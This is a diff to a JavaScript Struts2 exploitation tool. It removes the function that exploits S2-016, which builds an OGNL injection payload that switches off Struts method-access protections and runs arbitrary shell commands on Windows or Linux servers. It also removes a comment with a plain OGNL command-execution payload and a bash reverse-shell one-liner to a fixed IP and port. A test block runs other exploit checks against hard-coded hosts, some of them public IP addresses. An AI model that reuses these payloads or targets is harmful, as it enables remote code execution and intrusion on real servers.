@@ -578,49 +578,6 @@ function doStruts2_009(url, fnCbk)
 }
 
 // /robots.txt
-/*
- "action:", "redirect:", "redirectAction:" 
-/default.action?redirect:
-${#context['xwork.MethodAccessor.denyMethodExecution']=false,#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#f.setAccessible(true),#f.set(#_memberAccess,true),@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())}
-// bash -i >& /dev/tcp/192.168.24.90/4444 0>&1
-// s2_016,s2_017
-//////////*/
-function doStruts2_016(url)
-{
-	var szOldUrl = url;
-	url = fnNotEnd(url);
-	var s = "${#context['xwork.MethodAccessor.denyMethodExecution']=false"
-		//////// 增加的关键行 start//////
-		+ ",#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess')"
-		+ ",#f.setAccessible(true)"
-		+ ",#f.set(#_memberAccess,true)"
-		//////// 增加的关键行 end//////
-		+ ",#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))"
-		+ ',#cmds=(#iswin?{"cmd.exe","/c","' + g_szCmdW + '"}:{"/bin/bash","-c","' + g_szCmd + '"})'
-		+ ",#p=new java.lang.ProcessBuilder(#cmds)"
-		+ ",#p.redirectErrorStream(true),#process=#p.start()"
-		+ ",#c=new java.io.InputStreamReader(#process.getInputStream()),#d=new java.io.BufferedReader(#c),#e=new char[50000]"
-		+ ",#i=#d.read(#e),#as=new java.lang.String(#e,0,#i)" 
-		// + ",#i=#d.read(#e),#as=#as+new java.lang.String(#e,0,#i)" 
-		// + ",#i=#d.read(#e),#as=#as+new java.lang.String(#e,0,#i)" 
-		+ ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
-		+ ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
-		//+ ",#as=(@java.net.URLEncoder@encode(#as,'UTF-8'))"
-		// + ",#as='{{'+#as+'}}'"
-		+ ",#as.toString()"
-		+"}";
-	var oR = fnOptHeader({method: 'GET',uri: url + "?redirectAction:" + encodeURIComponent(s)
-		});
-	oR.followAllRedirects = oR.followRedirect=true;
-	request(oR,
-    	function(e,r1,b)
-    {
-    	// var r = /\{\{([^\}]+)\}\}/gmi.exec(b.toString()),sR = r && r[1] || "";
-    	// console.log(e || b);
-    	if(!e)fnDoBody(e||b,"s2-016",szOldUrl);
-    });
-}
-
 // Tomcat 8下导致RCE
 function doStruts2_020(url, fnCbk)
 {
@@ -975,7 +932,7 @@ if(program.test)
 	//*
 	runChecks("http://125.71.203.122:9088/","t3,weblogic");
 	runChecks("http://192.168.10.216:8082/s2-032/","struts2,045");
-	doStruts2_016.call({name:null},"http://192.168.10.216:8088/S2-016/default.action");
+	// doStruts2_016.call({name:null},"http://192.168.10.216:8088/S2-016/default.action");
  	// doStruts2_005.call({name:null},"http://192.168.10.216:8088/S2-005/example/HelloWorld.action");
 	doStruts2_032.call({name:null},"http://192.168.10.216:8088/s2-032/memoindex.action");
 	// doStruts2_015.call({name:null},"http://101.89.63.203:2001/jnrst/");
